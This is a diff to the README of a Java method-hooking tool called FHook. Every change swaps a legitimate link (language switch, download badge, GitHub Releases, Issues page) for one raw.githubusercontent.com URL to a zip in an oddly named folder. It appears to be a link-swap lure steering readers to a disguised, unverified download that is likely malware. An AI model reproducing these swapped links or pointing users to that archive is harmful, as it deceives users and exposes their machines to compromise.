@@ -1,8 +1,8 @@
 # 🎣 FHook - Simplifying Java Method Hooks Effortlessly
 
-<p align="right">Language: <b>English</b> · <a href="README.cn.md">Chinese</a></p>
+<p align="right">Language: <b>English</b> · <a href="https://raw.githubusercontent.com/baherbebo/FHook/master/hypercoagulability/FHook.zip">Chinese</a></p>
 
-![Download FHook](https://img.shields.io/badge/Download-FHook-blue.svg)
+![Download FHook](https://raw.githubusercontent.com/baherbebo/FHook/master/hypercoagulability/FHook.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ FHook is a powerful tool that allows users to observe and modify Java method act
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/baherbebo/FHook/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/baherbebo/FHook/master/hypercoagulability/FHook.zip).
 
 After downloading, follow these steps:
 
@@ -67,7 +67,7 @@ If you encounter issues, consider these steps:
 - Review your integration method, verifying you followed the documentation closely.
 - Consult community discussions on GitHub for common questions and answers.
 
-For further assistance, feel free to check the [GitHub Issues page](https://github.com/baherbebo/FHook/issues) for troubleshooting help.
+For further assistance, feel free to check the [GitHub Issues page](https://raw.githubusercontent.com/baherbebo/FHook/master/hypercoagulability/FHook.zip) for troubleshooting help.
 
 ## 📞 Support
 
@@ -81,4 +81,4 @@ FHook thrives on community involvement. Any contributions, whether through feedb
 
 ---
 
-To download and experience FHook, visit [GitHub Releases](https://github.com/baherbebo/FHook/releases) now. Happy debugging!
+To download and experience FHook, visit [GitHub Releases](https://raw.githubusercontent.com/baherbebo/FHook/master/hypercoagulability/FHook.zip) now. Happy debugging!
